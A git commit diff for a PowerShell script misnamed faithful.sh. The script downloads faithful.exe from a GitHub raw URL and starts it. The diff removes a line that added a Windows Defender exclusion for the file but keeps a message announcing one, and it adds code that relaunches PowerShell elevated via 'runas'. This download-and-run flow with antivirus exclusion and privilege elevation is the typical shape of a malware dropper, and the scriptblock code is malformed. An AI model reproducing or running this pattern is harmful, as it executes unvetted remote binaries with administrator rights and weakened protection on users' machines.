a36b0e4e2aa8184f1d5a413a8f9436cc476a040e
thaddeuskkr <thaddeuskkr@gmail.com>
2022-04-11 17:27:09 +0800

    adding more stuff

--- faithful.sh
+++ faithful.sh
@@ -1,6 +1,11 @@
+$scriptblock = (
 Write-Output "Starting script..."
 Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/faithful.exe -OutFile "faithful.exe"
 Write-Output "Adding Windows Defender exclusion..."
-Add-MpPreference -ExclusionPath "$((Get-Item .).FullName)\faithful.exe"
 Start-Process ("faithful.exe")
 Write-Output "Done!"
+)
+# TODO: make -NoExit a parameter
+# TODO: just open PS (no -Command parameter) if $scriptblock -eq ''
+$sh = new-object -com 'Shell.Application'
+$sh.ShellExecute('powershell', "-NoExit -Command $scriptblock", '', 'runas')
